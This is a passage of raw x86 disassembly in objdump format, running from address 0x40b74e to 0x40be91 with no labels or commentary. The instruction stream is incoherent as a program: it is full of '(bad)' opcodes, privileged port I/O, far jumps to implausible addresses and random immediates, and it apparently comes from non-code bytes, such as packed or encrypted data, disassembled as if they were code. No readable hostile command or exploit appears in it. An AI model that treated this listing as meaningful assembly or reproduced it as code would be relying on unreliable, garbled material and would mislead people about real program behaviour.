  40b74e:	mul    DWORD PTR [ebx+0x343d822e]
  40b754:	in     eax,dx
  40b755:	adc    DWORD PTR [edi],eax
  40b757:	cs cld 
  40b759:	sub    DWORD PTR [eax],eax
  40b75b:	push   esi
  40b75c:	mov    ah,0x78
  40b75e:	sbb    eax,0x26e0ca63
  40b763:	stos   BYTE PTR es:[edi],al
  40b764:	(bad)  
  40b765:	fisubr WORD PTR [edi+0xb924a2c]
  40b76b:	mov    al,0xe
  40b76d:	xchg   edi,eax
  40b76e:	ret    0x1a76
  40b771:	adc    edx,DWORD PTR [ecx]
  40b773:	loope  0x40b773
  40b775:	test   eax,0xfd75ab93
  40b77a:	lahf   
  40b77b:	sbb    eax,0xfcca045c
  40b780:	scas   eax,DWORD PTR es:[edi]
  40b781:	inc    esi
  40b782:	ret    0x18e9
  40b785:	pop    es
  40b786:	lock fisttp DWORD PTR [eax+0x208b3f38]
  40b78d:	or     dh,bl
  40b78f:	jg     0x40b7a0
  40b791:	jae    0x40b75a
  40b793:	mov    eax,0x222ebb14
  40b798:	popf   
  40b799:	xchg   ebp,eax
  40b79a:	xor    al,0x3f
  40b79c:	xor    dl,BYTE PTR [ebx*2+0x611b496c]
  40b7a3:	adc    DWORD PTR [edi],eax
  40b7a5:	mov    eax,edx
  40b7a7:	mov    bl,0xc4
  40b7a9:	cmp    DWORD PTR [ebx+esi*1-0x50],ebx
  40b7ad:	cmc    
  40b7ae:	adc    eax,0x5e3239f9
  40b7b3:	mov    eax,ds:0x2232443a
  40b7b8:	clc    
  40b7b9:	call   0x39169986
  40b7be:	add    edx,DWORD PTR [esi]
  40b7c0:	cmp    ebx,esp
  40b7c2:	adc    al,0x45
  40b7c4:	ret    0x2eb
  40b7c7:	push   edx
  40b7c8:	push   edx
  40b7c9:	cmp    eax,0x986be77d
  40b7ce:	sbb    al,0xda
  40b7d0:	mov    edi,0x51c76aa4
  40b7d5:	add    DWORD PTR [ecx+0x1],ecx
  40b7d8:	and    DWORD PTR [eax+0x67],edi
  40b7db:	sub    edx,DWORD PTR [ecx-0x40]
  40b7de:	aas    
  40b7df:	sbb    al,0xba
  40b7e1:	lds    ebx,FWORD PTR [edx+0x68508285]
  40b7e7:	mov    bh,0xdc
  40b7e9:	gs mov dh,0xf5
  40b7ec:	scas   al,BYTE PTR es:[edi]
  40b7ed:	cmp    eax,0x4962485a
  40b7f2:	mov    esp,esi
  40b7f4:	in     eax,0x4c
  40b7f6:	xchg   BYTE PTR [edx],ch
  40b7f8:	jne    0x40b7fb
  40b7fa:	fimul  DWORD PTR [ebx]
  40b7fc:	test   BYTE PTR [esi],bh
  40b7fe:	ret    0x1ce9
  40b801:	scas   eax,DWORD PTR es:[edi]
  40b802:	lock mov edi,0xab0bd1e1
  40b808:	imul   ebp,DWORD PTR [edi*8-0xc70b8df],0x7c
  40b810:	dec    ebx
  40b811:	stos   BYTE PTR es:[edi],al
  40b812:	add    eax,0xf38bb236
  40b817:	push   es
  40b818:	dec    ebx
  40b819:	cdq    
  40b81a:	test   BYTE PTR cs:[edx+0x4a],al
  40b81e:	lahf   
  40b81f:	cmp    eax,0x16691620
  40b824:	test   DWORD PTR [esi+0x6e],eax
  40b827:	sti    
  40b828:	sub    eax,0x4458a5e3
  40b82d:	std    
  40b82e:	add    eax,0xde17d4ac
  40b833:	ins    DWORD PTR es:[edi],dx
  40b834:	test   al,0xd9
  40b836:	ret    
  40b837:	int    0x1a
  40b839:	outs   dx,BYTE PTR ds:[esi]
  40b83a:	jecxz  0x40b87e
  40b83c:	imul   ebp,esp,0xfbc59acc
  40b842:	jg     0x40b7d3
  40b844:	xchg   edx,eax
  40b845:	xchg   edx,eax
  40b847:	adc    DWORD PTR [eax+0x38d9569d],edi
  40b84d:	adc    edi,esi
  40b84f:	xchg   ecx,eax
  40b850:	fcomp  DWORD PTR [ebx]
  40b852:	push   es
  40b853:	mov    ecx,0xd975862f
  40b858:	or     eax,0x5d43189
  40b85d:	sbb    DWORD PTR cs:[esi],esp
  40b860:	fisub  DWORD PTR [ebp+0x5e]
  40b863:	push   eax
  40b864:	data16 mov dl,0x1b
  40b867:	int3   
  40b868:	adc    BYTE PTR [esi+0x59],0x5e
  40b86c:	push   edi
  40b86d:	retf   
  40b86e:	pop    ss
  40b86f:	jbe    0x40b801
  40b871:	jno    0x40b81f
  40b873:	jns    0x40b878
  40b875:	pusha  
  40b876:	sub    al,0x2
  40b878:	das    
  40b879:	repz out 0x11,eax
  40b87c:	daa    
  40b87d:	psraw  mm6,QWORD PTR gs:[edx]
  40b881:	jbe    0x40b8af
  40b883:	pop    ecx
  40b884:	sub    ah,BYTE PTR [esi+0x4c637963]
  40b88a:	(bad)
  40b88e:	popf   
  40b88f:	(bad)  
  40b890:	xchg   ecx,eax
  40b891:	aas    
  40b892:	ins    DWORD PTR es:[edi],dx
  40b893:	fdiv   QWORD PTR [edx+0x25]
  40b896:	div    DWORD PTR [ebp-0x66]
  40b899:	das    
  40b89a:	test   eax,0x1583fa66
  40b89f:	ja     0x40b855
  40b8a1:	dec    ecx
  40b8a2:	inc    esp
  40b8a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b8a4:	jo     0x40b84f
  40b8a6:	and    eax,ebx
  40b8a8:	retf   0xc3c6
  40b8ab:	cmc    
  40b8ac:	pop    ecx
  40b8ad:	fwait
  40b8ae:	xor    dh,BYTE PTR [eax-0x634d7435]
  40b8b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b8b5:	cmp    eax,0x4baf3c06
  40b8ba:	mov    BYTE PTR [esi+0x1d],cl
  40b8bd:	push   esi
  40b8be:	fstp   DWORD PTR [edx]
  40b8c0:	stos   DWORD PTR es:[edi],eax
  40b8c1:	inc    edi
  40b8c2:	jns    0x40b8f1
  40b8c4:	cmp    DWORD PTR [ebp+ecx*2-0x46],edi
  40b8c8:	mov    dl,0xeb
  40b8ca:	and    esi,ebx
  40b8cc:	sti    
  40b8cd:	loop   0x40b8c8
  40b8cf:	out    dx,eax
  40b8d0:	sub    ah,BYTE PTR ds:0xda7db1db
  40b8d6:	dec    esp
  40b8d7:	(bad)  
  40b8d8:	mov    ebp,0x7441cb35
  40b8dd:	jae    0x40b8c0
  40b8df:	pop    esi
  40b8e0:	mov    esp,0xb168a487
  40b8e5:	jo     0x40b8cb
  40b8e7:	mov    ebp,0x34d69ecf
  40b8ec:	add    DWORD PTR [eax-0x22c8b25b],ebp
  40b8f2:	add    eax,0x69a46257
  40b8f7:	xchg   bh,ah
  40b8f9:	aad    0x34
  40b8fb:	sbb    BYTE PTR [ebp+0x23e352d8],0x71
  40b902:	jae    0x40b942
  40b904:	mov    cl,0xd
  40b906:	and    ch,bl
  40b908:	push   ss
  40b909:	out    0x49,eax
  40b90b:	sbb    eax,0xba673783
  40b910:	adc    BYTE PTR [esi+0xb676dcd],al
  40b916:	icebp  
  40b917:	sub    ebx,DWORD PTR [ecx+0x3d15b0b2]
  40b91d:	lock loop 0x40b8f9
  40b920:	(bad)
  40b923:	mov    edx,0xb18aab84
  40b928:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b929:	jmp    0x18d5a777
  40b92e:	sbb    esi,DWORD PTR [esi]
  40b930:	adc    ebp,DWORD PTR [edi]
  40b932:	inc    esp
  40b933:	cmc    
  40b934:	data16 loopne 0x40b8e3
  40b937:	leave  
  40b938:	dec    ebp
  40b939:	mov    cl,0xc1
  40b93b:	cmp    BYTE PTR [ebx+0x11],dl
  40b93e:	mov    ch,0x67
  40b940:	das    
  40b941:	ins    DWORD PTR es:[edi],dx
  40b942:	xchg   ebx,eax
  40b943:	jmp    FWORD PTR [edx]
  40b945:	lea    ecx,[ebp-0x695e826f]
  40b94b:	push   edx
  40b94c:	xor    BYTE PTR [ebp-0x5392608a],bl
  40b952:	dec    ebp
  40b953:	ja     0x40b988
  40b955:	mov    ah,BYTE PTR gs:0xc123aa81
  40b95c:	or     BYTE PTR [ecx],dl
  40b95e:	js     0x40b9d8
  40b960:	nop
  40b961:	pop    esp
  40b962:	and    BYTE PTR [esi+eiz*8+0x6abe58a4],bh
  40b969:	in     eax,dx
  40b96a:	pop    edi
  40b96b:	xor    eax,0xf96f791a
  40b970:	lahf   
  40b971:	sub    DWORD PTR [esp+ebp*8+0xff33dde],0x40
  40b979:	pop    ecx
  40b97a:	sbb    edi,DWORD PTR [eax+0x21]
  40b97d:	mov    edi,0x1337f57d
  40b982:	xchg   edx,eax
  40b983:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b984:	inc    ebx
  40b985:	mov    ecx,0xa578bacb
  40b98a:	or     BYTE PTR [edi+0x21c674ef],dh
  40b990:	lahf   
  40b991:	sbb    esp,DWORD PTR [ebx+0x5]
  40b994:	hlt    
  40b995:	jo     0x40b955
  40b997:	test   edx,esp
  40b999:	xor    ch,dh
  40b99b:	in     eax,dx
  40b99c:	(bad)  
  40b99d:	mov    ds:0x4d956c1f,al
  40b9a2:	out    dx,eax
  40b9a3:	xchg   edx,eax
  40b9a4:	mov    ah,0x13
  40b9a6:	dec    eax
  40b9a7:	rcl    BYTE PTR [esp+ecx*8],1
  40b9aa:	arpl   WORD PTR [ebx],cx
  40b9ac:	pop    ds
  40b9ad:	or     eax,0x74c2f753
  40b9b2:	xchg   esp,eax
  40b9b3:	iret   
  40b9b4:	adc    DWORD PTR [ecx+0x29],esp
  40b9b7:	pop    es
  40b9b8:	fadd   DWORD PTR [ecx-0x11]
  40b9bb:	mov    DWORD PTR [esi],edi
  40b9bd:	in     eax,dx
  40b9be:	xor    eax,0x6d34739f
  40b9c3:	jle    0x40ba40
  40b9c5:	jae    0x40b993
  40b9c7:	int3   
  40b9c8:	repnz out 0x7a,eax
  40b9cb:	stos   DWORD PTR es:[edi],eax
  40b9cc:	int3   
  40b9cd:	mov    ds:0xcce09c5f,eax
  40b9d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b9d3:	stc    
  40b9d4:	inc    ebp
  40b9d5:	mov    fs,WORD PTR [ebp+esi*8+0x3c]
  40b9d9:	dec    esp
  40b9da:	mov    ds,WORD PTR [edx-0x7747706a]
  40b9e0:	and    DWORD PTR ds:0x3acc3659,eax
  40b9e6:	cmp    BYTE PTR [ebx+edx*4-0x3e36eba4],0xd3
  40b9ee:	out    dx,eax
  40b9ef:	jbe    0x40ba0a
  40b9f1:	popa   
  40b9f2:	inc    esp
  40b9f3:	jle    0x40b9d4
  40b9f5:	cmp    dl,BYTE PTR [edi-0x6c6eeefb]
  40b9fb:	inc    esi
  40b9fc:	xor    eax,ebp
  40b9fe:	int    0xad
  40ba00:	mov    ecx,0xeedb661b
  40ba05:	xchg   esp,eax
  40ba06:	dec    ebp
  40ba07:	aas    
  40ba08:	leave  
  40ba09:	or     al,ch
  40ba0b:	push   ss
  40ba0c:	jnp    0x40b995
  40ba0e:	aas    
  40ba0f:	jno    0x40b9de
  40ba11:	mov    ch,BYTE PTR [esi-0x52]
  40ba14:	adc    ch,BYTE PTR [edi+0x3a]
  40ba17:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ba18:	(bad)  
  40ba1a:	cmp    al,0x78
  40ba1c:	mov    ds:0xa22a12d6,al
  40ba21:	fstp   TBYTE PTR [ecx]
  40ba23:	xchg   edi,eax
  40ba24:	inc    ecx
  40ba25:	xchg   ebp,eax
  40ba26:	jp     0x40ba61
  40ba28:	mov    es,WORD PTR [ecx-0x4]
  40ba2b:	or     dl,dl
  40ba2d:	or     bl,bh
  40ba2f:	sub    eax,0xd7f64314
  40ba34:	loopne 0x40b9d5
  40ba36:	shl    esp,cl
  40ba38:	add    dl,BYTE PTR [esi]
  40ba3a:	mov    dl,0x58
  40ba3c:	dec    esi
  40ba3d:	data16 in al,0xd2
  40ba40:	xor    edx,ecx
  40ba42:	pop    ebx
  40ba43:	int3   
  40ba44:	push   esp
  40ba45:	test   al,0xad
  40ba47:	inc    eax
  40ba48:	rcr    DWORD PTR [edi+0x2e],cl
  40ba4b:	lock push esi
  40ba4d:	and    al,0x99
  40ba4f:	cmp    bl,0xdb
  40ba52:	ficomp DWORD PTR [ebp-0x6d]
  40ba55:	cmc    
  40ba56:	(bad)
  40ba59:	sbb    cl,BYTE PTR [edi-0x78]
  40ba5c:	pusha  
  40ba5d:	das    
  40ba5e:	or     eax,0x55956fb7
  40ba63:	lods   al,BYTE PTR ds:[esi]
  40ba64:	leave  
  40ba65:	push   ecx
  40ba66:	xor    BYTE PTR [ebx],dh
  40ba68:	cld    
  40ba69:	leave  
  40ba6a:	adc    esp,DWORD PTR [esi-0x1]
  40ba6d:	xor    edx,esi
  40ba6f:	mul    DWORD PTR [esi]
  40ba71:	nop
  40ba72:	gs call 0xcffc3021
  40ba78:	xor    ecx,edi
  40ba7a:	dec    edi
  40ba7b:	add    al,BYTE PTR ds:[ecx+edi*2+0x80fa903]
  40ba83:	cdq    
  40ba84:	mov    bh,0xbf
  40ba86:	mov    edi,0xa00ef20e
  40ba8b:	xor    BYTE PTR [edi],0x9b
  40ba8e:	(bad)  
  40ba8f:	les    ecx,FWORD PTR [esi-0x76622dcf]
  40ba95:	xor    ah,BYTE PTR [esi-0x80]
  40ba98:	push   esi
  40ba99:	dec    esi
  40ba9a:	jge    0x40ba28
  40ba9c:	adc    DWORD PTR [ecx+0x142d46e6],ebp
  40baa2:	ret    
  40baa3:	test   ah,cl
  40baa5:	pushf  
  40baa6:	ds dec ecx
  40baa8:	scas   al,BYTE PTR es:[edi]
  40baa9:	jge    0x40bb09
  40baab:	sbb    edx,ebx
  40baad:	xchg   edi,eax
  40baae:	aas    
  40baaf:	sub    bl,BYTE PTR [esi+0x41]
  40bab2:	or     eax,0xb5137a67
  40bab7:	loope  0x40bad4
  40bab9:	mov    ?,WORD PTR [ecx-0x1ebeb223]
  40babf:	sbb    BYTE PTR [ebx],ah
  40bac1:	and    ah,0x22
  40bac4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bac5:	sub    ah,BYTE PTR [eax+0x5cd976a6]
  40bacb:	mov    ebx,0xce600505
  40bad0:	stc    
  40bad1:	add    DWORD PTR [ecx+0x196cb9e6],ebx
  40bad7:	xchg   esi,eax
  40bad8:	dec    edi
  40bad9:	xchg   si,ax
  40badb:	push   esp
  40badc:	mov    dl,0x66
  40bade:	lahf   
  40badf:	icebp  
  40bae0:	jnp    0x40baa4
  40bae2:	or     dl,BYTE PTR [edi+0x42]
  40bae5:	sub    DWORD PTR [edx],eax
  40bae7:	xchg   ecx,eax
  40bae8:	cmp    al,0xdb
  40baea:	cmc    
  40baeb:	arpl   sp,si
  40baed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40baee:	imul   eax,DWORD PTR [ebp-0x29],0x3b
  40baf2:	push   0x511d26e7
  40baf7:	pusha  
  40baf8:	adc    ch,BYTE PTR [edx+0x7c]
  40bafb:	scas   al,BYTE PTR es:[edi]
  40bafc:	idiv   BYTE PTR [ecx+0x0]
  40baff:	jmp    0x584a:0x61f90328
  40bb06:	pslld  mm6,mm3
  40bb09:	jb     0x40bace
  40bb0b:	add    BYTE PTR [edx+0xf],0x41
  40bb0f:	lods   al,BYTE PTR ds:[esi]
  40bb10:	mov    dl,0x8d
  40bb12:	mov    ecx,0x351af728
  40bb17:	enter  0xfe3d,0xe8
  40bb1b:	push   ebx
  40bb1c:	rcl    esi,0x81
  40bb1f:	setle  BYTE PTR ds:0xda52980
  40bb26:	into   
  40bb27:	add    al,BYTE PTR [eax]
  40bb29:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  40bb2b:	sti    
  40bb2c:	lea    ebp,[ebx]
  40bb2e:	cmp    eax,0xa7cc1c6e
  40bb33:	mov    eax,0x76b866b0
  40bb38:	jb     0x40bacf
  40bb3a:	scas   al,BYTE PTR es:[edi]
  40bb3b:	sub    eax,0x107039ed
  40bb40:	mov    edi,0xf5cb8bd0
  40bb45:	scas   al,BYTE PTR es:[edi]
  40bb46:	adc    esi,edx
  40bb48:	ret    
  40bb49:	push   ecx
  40bb4a:	cs out 0xca,al
  40bb4d:	jg     0x40bbce
  40bb4f:	test   edx,esi
  40bb51:	aaa    
  40bb52:	in     eax,dx
  40bb53:	dec    ebx
  40bb54:	cmp    esp,DWORD PTR [ebp-0x3966dae6]
  40bb5a:	sub    al,0x9a
  40bb5c:	adc    al,0x5c
  40bb5e:	jle    0x40bb72
  40bb60:	xchg   ecx,eax
  40bb61:	xchg   DWORD PTR [esp+ebp*4+0x5b130f81],ecx
  40bb68:	leave  
  40bb69:	mov    bl,0xbc
  40bb6b:	fstp   QWORD PTR [edi-0x12]
  40bb6e:	add    al,0x58
  40bb70:	xlat   BYTE PTR ds:[ebx]
  40bb71:	es (bad) 
  40bb73:	lds    eax,FWORD PTR [eax]
  40bb75:	dec    ebx
  40bb76:	sbb    al,0xbe
  40bb78:	mov    ss,WORD PTR [eax+0x36]
  40bb7b:	add    DWORD PTR [esi+0x3eba8b0],esp
  40bb81:	or     eax,esi
  40bb83:	out    0x64,al
  40bb85:	mov    ebx,0xd881fef8
  40bb8a:	cmp    eax,0x7e37ebb2
  40bb8f:	jecxz  0x40bb46
  40bb91:	xchg   BYTE PTR [ebx+eax*2],ah
  40bb94:	aaa    
  40bb95:	push   ss
  40bb96:	sbb    DWORD PTR [edi-0x2a],edx
  40bb99:	into   
  40bb9a:	pop    ds
  40bb9b:	dec    ecx
  40bb9c:	mov    esi,0xf31ea4e5
  40bba1:	je     0x40bb99
  40bba3:	fidiv  WORD PTR [ecx-0x5d]
  40bba6:	mov    esi,0xf053dae5
  40bbab:	pushf  
  40bbac:	jne    0x40bc2d
  40bbae:	xor    DWORD PTR [esi+0x7d],ebp
  40bbb1:	cmp    al,0x9c
  40bbb3:	inc    ecx
  40bbb4:	dec    edx
  40bbb5:	push   esi
  40bbb6:	jns    0x40bb69
  40bbb8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bbb9:	cld    
  40bbba:	push   esi
  40bbbb:	add    BYTE PTR [eax-0x16654e24],bl
  40bbc1:	inc    ebx
  40bbc2:	inc    edi
  40bbc3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bbc4:	jle    0x40bbdc
  40bbc6:	push   ebx
  40bbc7:	enter  0xbd46,0x18
  40bbcb:	and    DWORD PTR [ecx-0x4d],0xffffffaa
  40bbcf:	sub    BYTE PTR cs:[ecx],al
  40bbd2:	sbb    al,0x3a
  40bbd4:	sbb    BYTE PTR [edx-0x365df690],bh
  40bbda:	adc    BYTE PTR [eax+0x5c],al
  40bbdd:	push   edi
  40bbde:	xchg   edx,eax
  40bbdf:	sub    dh,bh
  40bbe1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bbe2:	les    ecx,FWORD PTR [esi-0x58]
  40bbe5:	imul   edi,DWORD PTR [edx],0x7dd22bf4
  40bbeb:	test   eax,0xb099f46c
  40bbf0:	push   0xfffffff1
  40bbf2:	mov    bl,0x13
  40bbf4:	lds    esi,FWORD PTR [ebx-0x61387b9c]
  40bbfa:	std    
  40bbfb:	and    DWORD PTR [edi+esi*1-0x4be08729],ecx
  40bc02:	inc    edi
  40bc03:	push   cs
  40bc04:	ficomp DWORD PTR [ebx+0x51]
  40bc07:	in     al,0xd6
  40bc09:	retf   0x99b7
  40bc0c:	icebp  
  40bc0d:	jecxz  0x40bc06
  40bc0f:	and    dh,BYTE PTR [ebx+0x26]
  40bc12:	les    eax,FWORD PTR [esi]
  40bc14:	or     al,BYTE PTR [ecx+0x24]
  40bc17:	push   cs
  40bc18:	xchg   ecx,eax
  40bc19:	test   DWORD PTR [eax-0x7e],ebx
  40bc1c:	aaa    
  40bc1d:	add    al,0x7a
  40bc1f:	and    dl,BYTE PTR [ebx+0xa]
  40bc22:	enter  0x933e,0x23
  40bc26:	cmp    ecx,DWORD PTR [eax]
  40bc28:	push   edi
  40bc29:	xchg   DWORD PTR [edx+0x13],esp
  40bc2c:	sub    al,0x4
  40bc2e:	fimul  WORD PTR [ebx]
  40bc30:	pop    ss
  40bc31:	or     ecx,DWORD PTR [ebx+edi*8+0x53]
  40bc35:	push   ecx
  40bc36:	jno    0x40bbf2
  40bc38:	data16 mov al,ds:0xdfc822ba
  40bc3e:	data16 mov dh,0xae
  40bc41:	fsubr  QWORD PTR [edx-0x31]
  40bc44:	jmp    0x992b893c
  40bc49:	fcomp  st(3)
  40bc4b:	lods   eax,DWORD PTR ds:[esi]
  40bc4c:	test   eax,0xc3a39bff
  40bc51:	inc    ebx
  40bc52:	push   ebp
  40bc53:	les    edi,FWORD PTR [esi+0x28]
  40bc56:	stc    
  40bc57:	mov    ebp,0xff1d8ab9
  40bc5c:	sub    al,0x40
  40bc5e:	pop    ecx
  40bc5f:	or     DWORD PTR [ecx],ecx
  40bc61:	ret    0x3e9d
  40bc64:	or     bh,dh
  40bc66:	jns    0x40bcde
  40bc68:	xor    BYTE PTR [eax-0x1f4136bb],dh
  40bc6e:	cmp    eax,0x8f7506e0
  40bc73:	enter  0xe661,0xd1
  40bc77:	jo     0x40bc01
  40bc79:	int3   
  40bc7a:	and    DWORD PTR [edx+0x43],0x5b
  40bc7e:	sbb    al,0xa5
  40bc80:	(bad)  
  40bc82:	fdivp  st(3),st
  40bc84:	retf   
  40bc85:	stos   BYTE PTR es:[edi],al
  40bc86:	sub    al,0xfe
  40bc88:	sub    al,BYTE PTR [ecx+esi*8]
  40bc8b:	es add eax,ebx
  40bc8e:	fs xchg edx,eax
  40bc90:	and    edi,DWORD PTR [eax-0x4fd5f1af]
  40bc96:	pop    eax
  40bc97:	test   ebp,0x431dce88
  40bc9d:	call   0xdbde12b7
  40bca2:	xlat   BYTE PTR ds:[ebx]
  40bca3:	ss fs test eax,0x6cd9ee38
  40bcaa:	jecxz  0x40bc52
  40bcac:	mov    esi,0x98cada67
  40bcb1:	das    
  40bcb2:	jb     0x40bcbf
  40bcb4:	xor    dl,0x9d
  40bcb7:	out    0x69,eax
  40bcb9:	test   al,0x4a
  40bcbb:	idiv   DWORD PTR [edx-0x2d]
  40bcbe:	vpunpckhdq xmm0,xmm3,XMMWORD PTR [eax]
  40bcc2:	xor    eax,0x917855
  40bcc7:	mov    eax,0xfada7f41
  40bccc:	mov    bh,0xfc
  40bcce:	clc    
  40bccf:	pop    edx
  40bcd0:	cmp    dl,BYTE PTR [ebp+0x46]
  40bcd3:	mov    esi,0xd16bd039
  40bcd8:	int    0x97
  40bcda:	psrlq  mm6,QWORD PTR [eax]
  40bcdd:	daa    
  40bcde:	xor    cl,BYTE PTR [eax+0x2fdc456e]
  40bce4:	dec    eax
  40bce5:	rol    BYTE PTR [eax-0x31c52586],cl
  40bceb:	or     DWORD PTR [edx+esi*4-0x144fbb6e],ecx
  40bcf2:	pop    esp
  40bcf3:	jl     0x40bd53
  40bcf5:	xchg   esi,eax
  40bcf6:	aad    0xeb
  40bcf8:	scas   al,BYTE PTR es:[edi]
  40bcf9:	dec    eax
  40bcfa:	clc    
  40bcfb:	xchg   ebx,eax
  40bcfc:	push   esi
  40bcfd:	loopne 0x40bcf1
  40bcff:	dec    eax
  40bd00:	dec    esp
  40bd01:	call   0xdbaa:0xc0fefba2
  40bd08:	lahf   
  40bd09:	push   esp
  40bd0a:	out    0x7c,eax
  40bd0c:	mov    bh,0x50
  40bd0e:	mov    edx,0x2228b148
  40bd13:	(bad)  
  40bd14:	(bad)
  40bd17:	repnz (bad) 
  40bd19:	ja     0x40bced
  40bd1b:	pushf  
  40bd1c:	push   edx
  40bd1d:	inc    edi
  40bd1e:	iret   
  40bd1f:	pop    esi
  40bd20:	jl     0x40bd7b
  40bd22:	fcom   QWORD PTR [edi]
  40bd24:	add    eax,DWORD PTR [edx]
  40bd26:	xchg   esi,eax
  40bd27:	xor    eax,0xc2362a97
  40bd2c:	sub    esp,DWORD PTR [esi]
  40bd2e:	mov    cl,0xab
  40bd30:	sbb    al,0x42
  40bd32:	sub    al,0xc7
  40bd34:	pop    ebp
  40bd35:	icebp  
  40bd36:	mov    ch,0xd6
  40bd38:	mov    bl,0xa5
  40bd3a:	lds    edi,FWORD PTR [eax]
  40bd3c:	xchg   edi,eax
  40bd3d:	test   eax,0x10922cc9
  40bd42:	iret   
  40bd43:	das    
  40bd44:	fs mov ch,0xaf
  40bd47:	hlt    
  40bd48:	aaa    
  40bd49:	(bad)  [eax+0x7e]
  40bd4c:	aas    
  40bd4d:	nop
  40bd4e:	lea    ebp,[ecx]
  40bd50:	cmp    al,0x23
  40bd52:	xor    BYTE PTR [esi],0x92
  40bd55:	pop    DWORD PTR [edx+eax*1+0x5f39e149]
  40bd5c:	loopne 0x40bd1d
  40bd5e:	std    
  40bd5f:	jae    0x40bdb1
  40bd61:	pop    ebp
  40bd62:	stos   DWORD PTR es:[edi],eax
  40bd63:	lahf   
  40bd64:	jecxz  0x40bd7e
  40bd66:	mov    BYTE PTR [ebx+0x5a06fdb2],bl
  40bd6c:	dec    eax
  40bd6d:	sub    bl,dh
  40bd6f:	in     al,0x8d
  40bd71:	fwait
  40bd72:	or     DWORD PTR ss:[eax+0x6f],0xad233a09
  40bd7a:	fstp   DWORD PTR [ecx]
  40bd7c:	dec    ebx
  40bd7d:	or     al,0xb9
  40bd7f:	retf   
  40bd80:	jmp    0xe2da626c
  40bd85:	sbb    esp,edx
  40bd87:	xchg   DWORD PTR [edx+ebp*8],edi
  40bd8a:	in     eax,0x93
  40bd8c:	push   0x71915107
  40bd91:	sbb    esp,ecx
  40bd93:	dec    ebx
  40bd94:	cmp    BYTE PTR [ecx+0x57],bh
  40bd97:	mov    DWORD PTR [ecx-0x60],esp
  40bd9a:	dec    eax
  40bd9b:	lds    edi,FWORD PTR [esi-0x595e6944]
  40bda1:	and    al,0x3c
  40bda3:	loope  0x40bdd9
  40bda5:	into   
  40bda6:	push   esp
  40bda7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bda8:	mov    WORD PTR [edi],?
  40bdaa:	jne    0x40bdac
  40bdac:	scas   eax,DWORD PTR es:[edi]
  40bdad:	mov    cl,0x8a
  40bdaf:	js     0x40bdba
  40bdb1:	call   0xdb3574e7
  40bdb6:	int    0x99
  40bdb8:	jl     0x40bd42
  40bdba:	pop    ebx
  40bdbb:	imul   ebx,DWORD PTR [ecx+edi*2-0x5e78f5e1],0xffffff87
  40bdc3:	dec    edx
  40bdc4:	add    al,0x65
  40bdc6:	mov    edi,0xb871a69c
  40bdcb:	out    dx,al
  40bdcc:	mov    ebp,0x80072bd3
  40bdd1:	jmp    0x40bd63
  40bdd3:	inc    esi
  40bdd4:	(bad)  
  40bdd5:	push   ds
  40bdd6:	or     bl,ch
  40bdd8:	mov    ds:0xdd06376f,al
  40bddd:	push   esp
  40bdde:	jmp    0x40bdfb
  40bde0:	push   ds
  40bde1:	pushf  
  40bde2:	sub    ah,0xfc
  40bde5:	jmp    0x33a5d616
  40bdea:	sti    
  40bdeb:	mov    ah,0x4a
  40bded:	cmp    ecx,DWORD PTR [ebx+0x65494a82]
  40bdf3:	pop    edi
  40bdf4:	jns    0x40bd76
  40bdf6:	outs   dx,BYTE PTR ds:[esi]
  40bdf7:	(bad)  
  40bdf9:	push   esi
  40bdfa:	adc    esi,DWORD PTR [edx-0x5b]
  40bdfd:	scas   eax,DWORD PTR es:[edi]
  40bdfe:	lods   eax,DWORD PTR ds:[esi]
  40bdff:	js     0x40bdda
  40be01:	jo     0x40be22
  40be03:	mov    ecx,0x55b33693
  40be08:	clc    
  40be09:	cmp    ebp,DWORD PTR [edi+0x53]
  40be0c:	inc    ebp
  40be0d:	popa   
  40be0e:	inc    edi
  40be0f:	cld    
  40be10:	push   ebp
  40be11:	lock sub dl,dh
  40be14:	scas   eax,DWORD PTR es:[edi]
  40be15:	sub    eax,DWORD PTR [ecx+0x4a]
  40be18:	sbb    ecx,edi
  40be1a:	or     esp,DWORD PTR [ecx+0x777eaa9c]
  40be20:	lea    esp,[edi+0x2ec87a3f]
  40be26:	sub    dl,BYTE PTR [edi-0x37]
  40be29:	into   
  40be2a:	mov    ds:0xaafffe6f,eax
  40be2f:	pop    edx
  40be30:	pop    ss
  40be31:	leave  
  40be32:	addr16 mov esi,0xca1dc4ed
  40be38:	inc    esi
  40be39:	ins    BYTE PTR es:[edi],dx
  40be3a:	leave  
  40be3b:	xor    BYTE PTR [edx],0xd0
  40be3e:	out    dx,al
  40be3f:	cmp    BYTE PTR [ebx-0x2942d42e],0x86
  40be46:	sub    al,BYTE PTR [ebp-0x58]
  40be49:	sbb    al,0xc7
  40be4b:	jae    0x40be0b
  40be4d:	dec    esi
  40be4e:	adc    al,0x72
  40be50:	jne    0x40be24
  40be52:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40be53:	fldenv [edx+0x408b0e69]
  40be59:	les    ebx,FWORD PTR [eax+0x53]
  40be5c:	xchg   esp,eax
  40be5d:	int    0xb3
  40be5f:	ret    
  40be60:	or     edi,DWORD PTR [edi-0x34584213]
  40be66:	cs (bad) 
  40be68:	(bad)  
  40be69:	mov    edi,ebx
  40be6b:	jle    0x40be4e
  40be6d:	dec    ecx
  40be6e:	sbb    BYTE PTR [edi+0x2b],dl
  40be71:	mov    cl,al
  40be73:	pop    edi
  40be74:	rol    DWORD PTR [ebx],cl
  40be76:	adc    BYTE PTR [eax-0x3db32bb1],al
  40be7c:	dec    ebx
  40be7d:	sub    eax,0x538e5059
  40be82:	sub    bh,BYTE PTR [edi-0x7f9a9c6c]
  40be88:	xchg   DWORD PTR [ebx+0x1df3d72d],ebx
  40be8e:	int3   
  40be8f:	pop    esi
  40be90:	push   edi
  40be91:	push   es
